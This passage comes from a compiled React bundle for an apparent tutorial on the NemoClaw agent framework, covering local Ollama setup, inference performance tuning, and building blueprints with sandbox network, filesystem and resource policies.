ollama run llama3.1:8b

# Start the API server (runs in the background by default)
ollama serve
# The server listens on http://localhost:11434

# List downloaded models
ollama list

# Show model details (parameters, quantization, size)
ollama show llama3.1:8b`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Supported Models"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Ollama maintains a library of pre-packaged models that can be pulled by name. The library includes most popular open-weight models in various size and quantization variants."}),e.jsx(n,{title:"Popular Ollama Models for NemoClaw Development",headers:["Model","Size (Q4)","RAM/VRAM Needed","Best For"],rows:[["llama3.1:8b","~4.7 GB","8 GB","General agent development, good quality-to-size ratio"],["llama3.1:70b","~40 GB","48 GB+","High-quality agent responses, requires serious hardware"],["mistral:7b","~4.1 GB","8 GB","Fast inference, strong coding capabilities"],["codellama:13b","~7.4 GB","12 GB","Code-focused tasks, good for coding agents"],["phi3:mini","~2.2 GB","4 GB","Minimal hardware, rapid prototyping"],["qwen2.5:7b","~4.4 GB","8 GB","Strong multilingual and reasoning capabilities"],["deepseek-coder-v2:16b","~9 GB","16 GB","Code generation and analysis tasks"]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Configuring NemoClaw to Use Ollama"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Ollama exposes an OpenAI-compatible API at /v1 on port 11434. NemoClaw can connect to it just like any other OpenAI-compatible endpoint. The configuration is minimal."}),e.jsx(t,{language:"yaml",title:"NemoClaw blueprint configuration for Ollama",children:`# blueprint.yaml
llm:
  provider: "openai-compatible"
  base_url: "http://localhost:11434/v1"
  model: "llama3.1:8b"
  api_key: "ollama"  # Ollama accepts any non-empty string
  timeout: 120  # Ollama may be slower than cloud/NIM, allow more time
  max_retries: 2

llm_options:
  temperature: 0.1
  max_tokens: 4096`}),e.jsx(t,{language:"bash",title:"Testing the Ollama API endpoint",children:`# Ensure ollama is serving
ollama serve &

# Test OpenAI-compatible endpoint
curl http://localhost:11434/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "llama3.1:8b",
    "messages": [{"role": "user", "content": "Say hello"}],
    "max_tokens": 32
  }'

# Check available models via API
curl http://localhost:11434/v1/models | jq .`}),e.jsxs(a,{type:"info",title:"Ollama with Docker",children:[e.jsx("p",{children:"Ollama can also run inside Docker, which may be preferable for consistency with other containerized services in your NemoClaw stack. The official Docker image supports GPU passthrough."}),e.jsx(t,{language:"bash",children:`docker run -d --gpus all \\
  -v ollama:/root/.ollama \\
  -p 11434:11434 \\
  --name ollama \\
  ollama/ollama

# Pull a model into the containerized Ollama
docker exec -it ollama ollama pull llama3.1:8b`})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Ollama for NemoClaw Development Workflows"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The primary use case for Ollama in the NemoClaw ecosystem is rapid iteration during development. Here are the workflows where Ollama shines:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Policy Development:"})," When writing and testing network policies, filesystem policies, and resource limits, you need to run the agent repeatedly to verify that the sandbox behaves correctly. Ollama's low startup time and zero-cost inference make this iteration loop fast and cheap."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Blueprint Prototyping:"})," When creating custom blueprints, you want to test the agent's behavior quickly without worrying about API rate limits or costs. Ollama lets you run hundreds of test iterations against a local model."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Offline Development:"})," Ollama works without any internet connection (after the initial model download). This is useful for development on planes, in secure environments, or anywhere with unreliable connectivity."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"CI/CD Testing:"})," Automated test suites for NemoClaw configurations can use Ollama as a lightweight LLM backend, avoiding the need for cloud API keys in CI environments."]})]}),e.jsx(s,{title:"Ollama Is Not for Production",children:e.jsx("p",{children:"While Ollama is excellent for development, it is not optimized for production multi-agent workloads. It lacks the advanced batching, memory management, and throughput optimizations of vLLM and NIM. It typically serves one request at a time, meaning concurrent agent sessions will queue and experience increased latency. For production deployments, use NVIDIA NIM or vLLM. Treat Ollama as your development and testing tool."})}),e.jsx(o,{title:"Set Up Ollama for Local NemoClaw Development",difficulty:"intermediate",children:e.jsxs("ol",{className:"list-decimal list-inside space-y-2 mt-2",children:[e.jsx("li",{children:"Install Ollama on your development machine."}),e.jsx("li",{children:"Pull the llama3.1:8b model (or phi3:mini if you have limited VRAM)."}),e.jsx("li",{children:"Start the Ollama server and verify the API endpoint responds."}),e.jsx("li",{children:"Modify a NemoClaw blueprint to point at your local Ollama instance."}),e.jsx("li",{children:"Run a NemoClaw agent with the local model and verify it completes a simple task."}),e.jsx("li",{children:"Compare the response quality with a cloud-hosted model for the same task."})]})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"With Ollama, NIM, and vLLM as your local inference options, you have a complete toolkit for running models locally at every stage of the development lifecycle. The final section of this chapter covers performance tuning techniques that apply across all local inference engines to help you get the most out of your hardware."})]})}const P=Object.freeze(Object.defineProperty({__proto__:null,default:m},Symbol.toStringTag,{value:"Module"}));function h(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Performance Tuning for Local Inference"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Running a local inference engine is only the first step. Getting optimal performance from your hardware requires understanding how GPU memory is allocated, how batching affects throughput, how quantization trades quality for speed, and how the KV cache determines your concurrency limits. This section covers the key tuning parameters and techniques that apply across all local inference engines -- NIM, vLLM, and Ollama -- and provides a framework for benchmarking local inference against cloud endpoints."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"GPU Memory Management"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"GPU memory (VRAM) is the primary bottleneck in local inference. Understanding how it is consumed helps you make informed decisions about model selection, quantization, and concurrency settings. GPU memory during inference is consumed by three main components: model weights, the KV cache, and temporary activation buffers."}),e.jsx(r,{term:"KV Cache",definition:"The key-value cache stores the computed attention keys and values for all previously processed tokens in a sequence. During autoregressive generation, the KV cache allows the model to avoid recomputing attention over the entire sequence for each new token. The KV cache grows linearly with sequence length and is the primary consumer of GPU memory beyond the model weights themselves.",example:"A Llama 3.1 8B model at float16 uses approximately 16 GB for weights. With a 4096-token sequence, the KV cache adds roughly 1 GB per concurrent request. With 10 concurrent requests, the KV cache alone consumes 10 GB.",seeAlso:["PagedAttention","Sequence Length","Batch Size"]}),e.jsx(t,{language:"text",title:"GPU memory breakdown (approximate)",children:`Model Weights (Llama 3.1 8B at float16):     ~16 GB
Model Weights (Llama 3.1 8B at Q4):           ~5 GB

KV Cache per request (4096 tokens, float16):  ~1 GB
KV Cache per request (4096 tokens, Q8):       ~0.5 GB

Activation buffers and overhead:              ~0.5-1 GB

Example: Llama 3.1 8B (float16) on 24 GB GPU
  Weights:          16 GB
  Available for KV: ~7 GB
  Max concurrent:   ~7 requests at 4096 tokens

Example: Llama 3.1 8B (Q4) on 24 GB GPU
  Weights:          5 GB
  Available for KV: ~18 GB
  Max concurrent:   ~18 requests at 4096 tokens`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Quantization"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Quantization reduces the precision of model weights from their native format (typically float16 or bfloat16, using 2 bytes per parameter) to lower-precision representations (4-bit or 8-bit, using 0.5 or 1 byte per parameter). This directly reduces the memory footprint of the model weights, freeing GPU memory for the KV cache and enabling either larger models or more concurrent requests on the same hardware."}),e.jsx(n,{title:"Quantization Methods and Tradeoffs",headers:["Method","Bits","Memory Savings","Quality Impact","Supported By"],rows:[["None (float16)","16","Baseline","Full quality","All engines"],["GPTQ","4","~75%","Minimal for 7-13B, noticeable for 70B+","vLLM, NIM"],["AWQ","4","~75%","Slightly better than GPTQ on most benchmarks","vLLM, NIM"],["GGUF Q4_K_M","4","~75%","Good quality, optimized for CPU+GPU hybrid","Ollama, llama.cpp"],["GGUF Q8_0","8","~50%","Near-lossless","Ollama, llama.cpp"],["SqueezeLLM","4","~75%","Good for sparse models","vLLM"],["FP8","8","~50%","Near-lossless, hardware-accelerated on H100","NIM, vLLM"]]}),e.jsx(a,{type:"info",title:"Choosing a Quantization Level",children:e.jsx("p",{children:"For NemoClaw agent workloads, Q4 quantization (GPTQ, AWQ, or Q4_K_M) is generally the sweet spot. Agent tasks like code analysis, tool selection, and structured output generation are less sensitive to minor quality degradation than creative writing or nuanced reasoning. The 75% memory savings from Q4 quantization often matters more than the marginal quality difference, because it enables either running a larger model or handling more concurrent agent sessions."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Batch Sizing and Concurrency"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Batch size determines how many requests are processed simultaneously on the GPU. Increasing batch size improves throughput (total tokens per second across all requests) but increases per-request latency. For NemoClaw agents, the right balance depends on your deployment pattern."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Single Agent, Interactive:"})," Use a small batch size (1-4). Latency matters more than throughput because the human operator is watching the agent work in real time through the TUI."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Multiple Agents, Background:"})," Use a larger batch size (8-32). Throughput matters more because agents are running autonomously and total task completion time depends on aggregate throughput."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"CI/CD Testing:"})," Maximize batch size to complete test suites quickly. Latency per request is irrelevant; total test time matters."]})]}),e.jsx(t,{language:"bash",title:"Configuring batch size in vLLM",children:`# vLLM continuous batching -- set max concurrent sequences
python -m vllm.entrypoints.openai.api_server \\
  --model meta-llama/Llama-3.1-8B-Instruct \\
  --max-num-seqs 16 \\          # max concurrent requests in a batch
  --max-num-batched-tokens 8192  # max total tokens across all batched requests`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"KV Cache Optimization"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The KV cache is the largest variable memory consumer during inference. Optimizing it has a direct impact on how many concurrent requests you can serve and how long sequences can be."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Reduce max sequence length:"})," If your agent tasks consistently use fewer than 4096 tokens, set the maximum sequence length to 4096 instead of the model's native 128K. This caps the maximum KV cache size per request and prevents a single long request from consuming all available memory."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Use PagedAttention (vLLM):"})," vLLM's PagedAttention allocates KV cache in small pages rather than contiguous blocks, reducing fragmentation and enabling higher effective utilization of GPU memory."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"KV cache quantization:"})," Some engines support quantizing the KV cache to FP8 or INT8, halving its memory footprint with minimal quality impact. In vLLM, use --kv-cache-dtype fp8 on supported hardware."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Prefix caching:"})," When multiple agent requests share a common system prompt, prefix caching avoids recomputing and re-storing the KV cache for the shared prefix. vLLM supports this with --enable-prefix-caching."]})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Benchmarking Local vs. Cloud"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"To make an informed decision about local vs. cloud inference, you need to benchmark both options with realistic NemoClaw agent workloads. The key metrics to measure are time-to-first-token (TTFT), tokens per second (TPS), end-to-end task completion time, and cost per task."}),e.jsx(t,{language:"bash",title:"Simple benchmarking script",children:`#!/bin/bash
# Benchmark local inference endpoint
# Measures TTFT and throughput for a typical agent prompt

ENDPOINT="http://localhost:8000/v1/chat/completions"
MODEL="meta-llama/Llama-3.1-8B-Instruct"

# Warm up
curl -s -o /dev/null "$ENDPOINT" -H "Content-Type: application/json" \\
  -d "{"model": "$MODEL", "messages": [{"role": "user", "content": "Hello"}], "max_tokens": 16}"

# Time a realistic agent prompt
echo "=== Single Request Latency ==="
time curl -s -o /dev/null -w "TTFT: %{time_starttransfer}s, Total: %{time_total}s\\n" \\
  "$ENDPOINT" -H "Content-Type: application/json" \\
  -d "{
    "model": "$MODEL",
    "messages": [{"role": "system", "content": "You are an agent..."}, {"role": "user", "content": "Analyze the following Python code for security issues and suggest fixes: $(cat sample_code.py)"}],
    "max_tokens": 1024
  }"

# Concurrent request test (requires GNU parallel)
echo "=== Concurrent Throughput (10 requests) ==="
time seq 10 | parallel -j 10 curl -s -o /dev/null "$ENDPOINT" \\
  -H "Content-Type: application/json" \\
  -d "'{}'" ::: $(for i in $(seq 10); do echo "{"model": "$MODEL", "messages": [{"role": "user", "content": "Task $i"}], "max_tokens": 256}"; done)`}),e.jsx(n,{title:"Typical Benchmark Results (Llama 3.1 8B)",headers:["Metric","Cloud API","NIM (A6000)","vLLM (RTX 4090)","Ollama (RTX 4090)"],rows:[["TTFT","200-500 ms","50-100 ms","60-120 ms","80-150 ms"],["Tokens/sec (single)","80-120","40-60","35-55","30-45"],["Tokens/sec (10 concurrent)","800-1200","300-500","250-400","30-45 (no batching)"],["Cost per 1M tokens","$0.10-0.50","$0 (hardware amortized)","$0 (hardware amortized)","$0 (hardware amortized)"]]}),e.jsx(s,{title:"Benchmark Fairly",children:e.jsx("p",{children:"When comparing local to cloud inference, ensure you are comparing equivalent model quality. A cloud-hosted GPT-4 class model versus a local Llama 3.1 8B is not an apples-to-apples comparison. Compare the same model (or same parameter class) in both environments. Also factor in hardware costs: a single A6000 GPU costs roughly $4,000-5,000, which represents a significant upfront investment compared to pay-per-token cloud pricing. The breakeven point depends on your inference volume."})}),e.jsx(o,{title:"Benchmark Your Local Setup",difficulty:"advanced",children:e.jsxs("ol",{className:"list-decimal list-inside space-y-2 mt-2",children:[e.jsx("li",{children:"Set up a local inference engine (Ollama for simplicity, vLLM for production benchmarks)."}),e.jsx("li",{children:"Create a benchmark script that sends 10 sequential requests typical of your agent workload."}),e.jsx("li",{children:"Measure TTFT and total latency for each request."}),e.jsx("li",{children:"Run the same 10 requests against a cloud endpoint and record the same metrics."}),e.jsx("li",{children:"Calculate the total cost for 10,000 such requests on the cloud endpoint."}),e.jsx("li",{children:"Estimate how long it would take to recoup your GPU hardware cost at that usage rate."})]})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Performance tuning is an iterative process. Start with default configurations, measure your baseline, adjust one parameter at a time, and re-measure. The parameters that matter most depend on your specific workload -- agent concurrency, typical prompt length, required response length, and acceptable latency. With the techniques in this section, you have the tools to find the optimal configuration for your NemoClaw deployment."})]})}const S=Object.freeze(Object.defineProperty({__proto__:null,default:h},Symbol.toStringTag,{value:"Module"}));function p(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Anatomy of a NemoClaw Blueprint"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"A NemoClaw blueprint is a self-contained package that defines everything needed to run a specific type of agent within a secure sandbox. It specifies the agent's system prompt, the tools it has access to, the LLM configuration, the sandbox policies (network, filesystem, resources), and any initialization scripts that should run when the sandbox starts. Blueprints are the primary unit of configuration and distribution in NemoClaw -- when you share an agent configuration with someone, you share a blueprint."}),e.jsx(r,{term:"Blueprint",definition:"A declarative configuration package for NemoClaw that defines an agent's complete runtime environment: its identity (system prompt, model), capabilities (tools, MCP servers), security boundaries (network policy, filesystem policy, resource limits), and initialization behavior. Blueprints are stored as a directory of files with a blueprint.yaml manifest at the root.",example:"A 'code-reviewer' blueprint that configures an agent with access to git tools, read-only filesystem access to /workspace, network access only to api.github.com, and a system prompt instructing it to review pull requests for security issues.",seeAlso:["Policy","Sandbox Configuration","Agent Profile"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Blueprint Directory Structure"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"A blueprint is a directory containing a set of files with defined roles. The only required file is blueprint.yaml -- all other files are optional and extend the blueprint's functionality."}),e.jsx(t,{language:"text",title:"Blueprint directory structure",children:`my-agent-blueprint/
├── blueprint.yaml          # Required: main configuration manifest
├── system-prompt.md        # Optional: system prompt (can be inline in YAML)
├── policies/
│   ├── network.yaml        # Optional: network policy overrides
│   ├── filesystem.yaml     # Optional: filesystem policy overrides
│   └── resources.yaml      # Optional: resource limit overrides
├── tools/
│   ├── custom-tool.py      # Optional: custom tool definitions
│   └── tools.yaml          # Optional: tool configuration
├── scripts/
│   ├── init.sh             # Optional: runs when sandbox starts
│   └── healthcheck.sh      # Optional: periodic health checks
├── mcp/
│   └── servers.yaml        # Optional: MCP server configurations
├── tests/
│   ├── test-basic.yaml     # Optional: blueprint test cases
│   └── test-security.yaml  # Optional: security test cases
├── README.md               # Optional: human-readable documentation
└── .blueprint-lock         # Auto-generated: dependency lock file`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"The blueprint.yaml Manifest"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The blueprint.yaml file is the heart of every blueprint. It contains the top-level configuration that NemoClaw reads when loading the blueprint. Every field has sensible defaults, so a minimal blueprint.yaml can be very short, while a fully specified one provides complete control over every aspect of the agent's environment."}),e.jsx(t,{language:"yaml",title:"Complete blueprint.yaml reference",children:`# Blueprint metadata
name: "code-reviewer"
version: "1.2.0"
description: "An agent that reviews pull requests for security issues"
author: "your-org"
license: "Apache-2.0"

# LLM configuration
llm:
  provider: "openai-compatible"
  base_url: "https://integrate.api.nvidia.com/v1"
  model: "meta/llama-3.1-70b-instruct"
  api_key_env: "NVIDIA_API_KEY"    # Read API key from environment variable
  timeout: 30
  max_retries: 3

# Agent configuration
agent:
  system_prompt_file: "system-prompt.md"   # Reference to external file
  # Or inline:
  # system_prompt: "You are a code review agent..."
  max_turns: 50                    # Maximum conversation turns before stopping
  max_tool_calls_per_turn: 10     # Limit tool calls in a single turn

# Sandbox policies
policies:
  network:
    file: "policies/network.yaml"  # Reference to policy file
    # Or inline:
    # default: deny
    # allow:
    #   - host: "api.github.com"
    #     port: 443
  filesystem:
    file: "policies/filesystem.yaml"
  resources:
    file: "policies/resources.yaml"

# Tools available to the agent
tools:
  builtin:
    - shell           # Execute shell commands (within sandbox)
    - file_read       # Read files
    - file_write      # Write files
    - web_fetch       # Fetch URLs (subject to network policy)
  mcp_servers:
    - file: "mcp/servers.yaml"
  custom:
    - file: "tools/custom-tool.py"

# Initialization
init:
  scripts:
    - "scripts/init.sh"
  environment:
    REVIEW_MODE: "security"
    LOG_LEVEL: "info"

# Health checks
healthcheck:
  script: "scripts/healthcheck.sh"
  interval: 60          # seconds
  timeout: 10           # seconds

# Dependencies on other blueprints (composability)
extends: null           # Parent blueprint to inherit from
dependencies: []        # Other blueprints this one requires`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"How Blueprints Are Resolved"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When you run a NemoClaw agent with a blueprint, NemoClaw goes through a resolution process to find and load the blueprint. Understanding this process helps you debug issues when a blueprint is not loading as expected."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw searches for blueprints in the following order, stopping at the first match:"}),e.jsxs("ol",{className:"list-decimal list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Explicit path:"})," If the blueprint argument is an absolute or relative filesystem path (e.g., ./my-blueprint/ or /home/user/blueprints/code-reviewer/), NemoClaw loads it directly from that location."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Local blueprints directory:"})," NemoClaw checks ~/.nemoclaw/blueprints/","{name}","/blueprint.yaml for a locally installed blueprint matching the given name."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Project-level blueprints:"})," If a .nemoclaw/ directory exists in the current working directory or any parent directory, NemoClaw checks .nemoclaw/blueprints/","{name}","/blueprint.yaml."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Built-in blueprints:"}),' NemoClaw ships with a set of built-in blueprints (e.g., "default", "coding-agent", "research-agent"). These are embedded in the NemoClaw binary and used as a final fallback.']})]}),e.jsx(t,{language:"bash",title:"Blueprint resolution in practice",children:`# Use a blueprint by explicit path
nemoclaw run --blueprint ./my-blueprint/

# Use a blueprint by name (searches resolution chain)
nemoclaw run --blueprint code-reviewer

# List all available blueprints and their locations
nemoclaw blueprint list

# Show where a specific blueprint resolves to
nemoclaw blueprint resolve code-reviewer
# Output: /home/user/.nemoclaw/blueprints/code-reviewer/blueprint.yaml

# Show the fully resolved configuration (with all defaults applied)
nemoclaw blueprint inspect code-reviewer`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Configuration Format Details"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Blueprint configuration uses YAML with a few NemoClaw-specific conventions:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Environment variable references:"})," Any string value can reference an environment variable using the syntax ",'"${ENV_VAR}"',' or by using the _env suffix on key names (e.g., api_key_env: "NVIDIA_API_KEY" reads the value from the NVIDIA_API_KEY environment variable).']}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"File references:"})," Configuration values that can be large (system prompts, policies) support a file: key that points to an external file within the blueprint directory. The file path is relative to the blueprint root."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Inheritance:"})," The extends: key allows a blueprint to inherit from another blueprint. The child blueprint's values override the parent's, with deep merging for nested objects. This enables creating specialized variants of a base blueprint."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Validation:"})," NemoClaw validates the blueprint against a JSON schema at load time. Invalid configurations produce clear error messages indicating which fields are incorrect. Use nemoclaw blueprint validate to check a blueprint without running it."]})]}),e.jsx(a,{type:"info",title:"Minimal vs. Full Blueprints",children:e.jsx("p",{children:"A blueprint can be as simple as a single blueprint.yaml with just a name and an LLM configuration -- NemoClaw fills in all other values with secure defaults (deny-all network policy, read-only filesystem, conservative resource limits). Starting minimal and adding permissions as needed is the recommended approach. The default security posture is always restrictive; you explicitly open up only what the agent requires."})}),e.jsx(s,{title:"Sensitive Data in Blueprints",children:e.jsx("p",{children:"Never hardcode API keys, tokens, or credentials directly in blueprint files. Always use environment variable references (api_key_env) or external secret management. Blueprint files are often committed to version control or shared with others -- embedded secrets will be exposed. NemoClaw's blueprint validation will warn you if it detects values that look like hardcoded credentials."})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Understanding the anatomy of a blueprint is the foundation for creating your own. In the next section, we walk through the process of creating a custom blueprint from scratch, testing it, and iterating on its configuration."})]})}const R=Object.freeze(Object.defineProperty({__proto__:null,default:p},Symbol.toStringTag,{value:"Module"}));function g(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Creating Custom Blueprints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw's built-in blueprints cover common agent patterns, but real-world deployments often require custom configurations tailored to specific use cases, security requirements, and organizational policies. Creating a custom blueprint gives you full control over every aspect of the agent's environment: what it can access, how it behaves, and how it is secured. This section walks through the process from initial scaffolding to testing and iteration."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Starting from Scratch vs. Forking"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"You have two paths to creating a custom blueprint: starting from an empty scaffold or forking an existing blueprint. Forking is usually faster because you start with a working configuration and modify it, rather than building up from nothing. Starting from scratch gives you a cleaner result with no inherited assumptions, which is better when your use case is significantly different from any existing blueprint."}),e.jsx(t,{language:"bash",title:"Two approaches to creating a blueprint",children:`# Approach 1: Scaffold a new empty blueprint
nemoclaw blueprint init my-agent
# Creates my-agent/ with a minimal blueprint.yaml and directory structure

# Approach 2: Fork an existing blueprint
nemoclaw blueprint fork coding-agent my-custom-agent
# Creates my-custom-agent/ as a copy of the coding-agent blueprint
# with metadata updated (name, version reset to 0.1.0)`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Step-by-Step: Building a Blueprint from Scratch"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:'Let us build a blueprint for a "documentation agent" that reads source code and generates documentation. This agent needs read-only access to a project directory, write access to a docs output directory, and network access to an LLM endpoint.'}),e.jsx(i,{number:1,title:"Initialize the blueprint directory",children:e.jsx(t,{language:"bash",children:`nemoclaw blueprint init doc-generator
cd doc-generator

# Resulting structure:
# doc-generator/
# ├── blueprint.yaml
# ├── policies/
# └── scripts/`})}),e.jsx(i,{number:2,title:"Define the blueprint manifest",children:e.jsx(t,{language:"yaml",title:"blueprint.yaml",children:`name: "doc-generator"
version: "0.1.0"
description: "Reads source code and generates documentation"
author: "your-name"

llm:
  provider: "openai-compatible"
  base_url_env: "LLM_BASE_URL"
  model_env: "LLM_MODEL"
  api_key_env: "LLM_API_KEY"
  timeout: 60

agent:
  system_prompt_file: "system-prompt.md"
  max_turns: 100
  max_tool_calls_per_turn: 5

tools:
  builtin:
    - shell
    - file_read
    - file_write

policies:
  network:
    file: "policies/network.yaml"
  filesystem:
    file: "policies/filesystem.yaml"
  resources:
    file: "policies/resources.yaml"

init:
  environment:
    OUTPUT_DIR: "/workspace/docs"
  scripts:
    - "scripts/init.sh"`})}),e.jsx(i,{number:3,title:"Write the system prompt",children:e.jsx(t,{language:"markdown",title:"system-prompt.md",children:`You are a documentation generator agent. Your job is to read source code
files and produce clear, comprehensive documentation.

## Rules
- Read source files from /workspace/src (read-only)
- Write documentation output to /workspace/docs
- Generate Markdown files for each module/class/function
- Include code examples extracted from the source
- Do not modify any source files
- Do not access the internet except for LLM inference
- Do not execute any source code

## Output Format
For each source file, create a corresponding .md file in the output
directory with:
1. Module overview
2. Public API documentation
3. Usage examples
4. Type signatures where applicable`})}),e.jsx(i,{number:4,title:"Define the network policy",children:e.jsx(t,{language:"yaml",title:"policies/network.yaml",children:`# Network policy: only allow LLM endpoint
default: deny

allow:
  - group: "llm"
    description: "LLM inference endpoint"
    rules:
      # Allow the configured LLM endpoint
      # The actual host is resolved from the blueprint's llm.base_url
      - host: "integrate.api.nvidia.com"
        port: 443
        tls: required

# For local inference, replace with:
# - host: "localhost"
#   port: 8000`})}),e.jsx(i,{number:5,title:"Define the filesystem policy",children:e.jsx(t,{language:"yaml",title:"policies/filesystem.yaml",children:`# Filesystem policy: read source, write docs
default: deny

rules:
  # Read-only access to source code
  - path: "/workspace/src"
    access: read
    recursive: true

  # Read-write access to documentation output
  - path: "/workspace/docs"
    access: read-write
    recursive: true

  # Read access to common system files needed by tools
  - path: "/usr/lib"
    access: read
    recursive: true
  - path: "/usr/bin"
    access: read
    recursive: true

  # Temp directory for tool operations
  - path: "/tmp"
    access: read-write
    recursive: true`})}),e.jsx(i,{number:6,title:"Define resource limits",children:e.jsx(t,{language:"yaml",title:"policies/resources.yaml",children:`# Resource limits for the doc-generator agent
cpu:
  shares: 1024          # relative CPU weight
  max_cores: 2          # maximum CPU cores

memory:
  max_mb: 2048          # 2 GB maximum memory
  swap_mb: 512          # 512 MB swap

storage:
  max_mb: 1024          # 1 GB maximum disk usage in sandbox

processes:
  max_pids: 64          # maximum concurrent processes

time:
  max_runtime_minutes: 30  # kill agent after 30 minutes`})}),e.jsx(i,{number:7,title:"Create the initialization script",children:e.jsx(t,{language:"bash",title:"scripts/init.sh",children:`#!/bin/bash
# Initialization script for doc-generator blueprint

# Ensure output directory exists
mkdir -p /workspace/docs

# Verify source directory is accessible
if [ ! -d "/workspace/src" ]; then
  echo "ERROR: /workspace/src does not exist or is not mounted"
  exit 1
fi

echo "Doc-generator initialized. Source: /workspace/src, Output: /workspace/docs"
echo "Files to document: $(find /workspace/src -name '*.py' -o -name '*.js' -o -name '*.ts' | wc -l)"
`})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Testing Your Blueprint"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Before deploying a blueprint, you should validate its configuration and test it with realistic inputs. NemoClaw provides several tools for this purpose."}),e.jsx(t,{language:"bash",title:"Blueprint testing workflow",children:`# Step 1: Validate the blueprint configuration
nemoclaw blueprint validate ./doc-generator/
# Checks YAML syntax, schema compliance, file references, and policy consistency

# Step 2: Dry-run the blueprint (loads everything, does not start the agent)
nemoclaw run --blueprint ./doc-generator/ --dry-run
# Shows the fully resolved configuration, including defaults

# Step 3: Run with a test project
nemoclaw run --blueprint ./doc-generator/ \\
  --mount ./sample-project:/workspace/src:ro \\
  --mount ./test-output:/workspace/docs:rw \\
  --prompt "Document all Python files in /workspace/src"

# Step 4: Inspect the output
ls ./test-output/
